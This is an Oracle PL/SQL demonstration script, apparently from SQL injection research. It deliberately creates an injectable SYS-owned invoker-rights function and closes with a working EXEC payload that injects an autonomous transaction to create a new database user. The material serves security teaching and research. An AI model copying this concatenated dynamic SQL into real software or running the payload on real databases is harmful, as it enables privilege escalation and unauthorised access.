/*
  Advanced SQL Injection in Oracle databases
  Example of a function derfined with authid current_user vulnerable to SQL Injection in a PL/SQL anonymous block.

  By Esteban Martinez Fayo
  secemf@yahoo.com.ar
*/

------------
-- Execute this as a SYS or any other user that can create functions
------------

-- SQLIVULN_CUR_USR is a function vulnerable to SQL Injection in a PL/SQL anonymous
-- block that executes with the privilege of the caller (defined with AUTHID CURRENT_USER).
CREATE OR REPLACE FUNCTION "SYS"."SQLIVULN_CUR_USR"  (P_JOB VARCHAR2)
return VARCHAR2
authid current_user as
AVGSAL Numeric;
BEGIN
  EXECUTE IMMEDIATE 'BEGIN SELECT AVG(SAL) INTO :AVGSAL FROM SCOTT.EMP WHERE JOB = '''||P_JOB||'''; END;' USING OUT AVGSAL;
  return '';
END;
/


GRANT EXECUTE ON  "SYS"."SQLIVULN_CUR_USR" TO "SCOTT"
/


-- SYS.SQLIVULN is a procedure vulnerable to SQL Injection. The vulnerability exists
-- in a single PL/SQL statement (not in an anonymous PL/SQL block).
-- See file SQLInjectionLimitation.sql
-- To Exploit the attacker could execute:
EXEC SYS.SQLIVULN('MANAGER''||SYS.SQLIVULN_CUR_USR(''AA''''; execute immediate ''''declare pragma autonomous_transaction; begin execute immediate ''''''''create user eric identified by newpsw''''''''; commit; end;''''; end;--'')||''');
